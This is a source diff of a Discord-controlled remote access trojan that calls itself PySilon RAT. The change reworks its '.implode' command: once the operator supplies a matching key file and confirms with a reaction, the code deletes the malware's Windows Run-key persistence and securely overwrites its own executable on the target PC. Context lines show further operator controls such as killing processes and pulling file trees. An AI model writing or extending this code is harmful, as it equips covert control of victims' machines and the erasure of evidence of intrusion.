@@ -139,7 +139,7 @@ async def on_raw_reaction_add(payload):
 
 @client.event
 async def on_reaction_add(reaction, user):
-    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, implode_confirmation, expectation
+    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation
     if user.bot == False:
         try:
             match str(reaction):
@@ -155,6 +155,8 @@ async def on_reaction_add(reaction, user):
                             try: await i.delete()
                             except: pass
                         processes_messages = []
+                    elif expectation == 'implosion':
+                        expectation = None
 
                 case '📥':
                     if reaction.message.content[:15] == '```End of tree.':
@@ -229,10 +231,14 @@ async def on_reaction_add(reaction, user):
                             reaction_msg = await reaction.message.channel.send('```Error while killing processes...\n' + str(e) + '```')
                             await reaction_msg.add_reaction('🔴')
                     
-                    elif reaction.message == implode_confirmation and expectation == 'implosion':
-                        implode_stuff
+                    elif expectation == 'implosion':
+                        registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+                        winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+                        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
+                        winreg.DeleteValue(registry_key, software_directory_name)
+                        secure_delete_file(sys.argv[0], 1000)
 
-        except: pass
+        except Exception as err: print(err)
 
 @client.event
 async def on_raw_reaction_remove(payload):
@@ -506,22 +512,26 @@ async def on_message(message):
 
         elif message.content == '.implode':
             await message.delete()
-            await message.channel.send('``` `````` `````` `````` `````` ```||❗||\n||❗||\n||❗||```Send here PySilon.key generated along with RAT executable```||❗||\n||❗||\n||❗||')
+            await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
             expectation = 'key'
 
 
         elif expectation == 'key':
-            split_v1 = str(message.attachments).split("filename='")[1]
-            filename = str(split_v1).split("' ")[0]
-            await message.attachments[0].save(fp=filename)
-            if get_file_hash(filename) == secret_key:
-                reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
-                await reaction_msg.add_reaction('💀')
-                await reaction_msg.add_reaction('🔴')
-                implode_confirmation, expectation = reaction_msg, 'implosion'
-            else:
-                print('no')
-
+            try:
+                split_v1 = str(message.attachments).split("filename='")[1]
+                filename = str(split_v1).split("' ")[0]
+                await message.attachments[0].save(fp=filename)
+                if get_file_hash(filename) == secret_key:
+                    reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
+                    await reaction_msg.add_reaction('💀')
+                    await reaction_msg.add_reaction('🔴')
+                    expectation = 'implosion'
+                else:
+                    reaction_msg = await message.channel.send('```❗ Provided key is invalid```'); await reaction_msg.add_reaction('🔴')
+                    expectation = None
+            except:
+                await message.channel.send('```❗ Something went wrong while fetching secret key...```')
+                expectation = None
 
         elif expectation == 'onefile':
             split_v1 = str(message.attachments).split('filename=\'')[1]
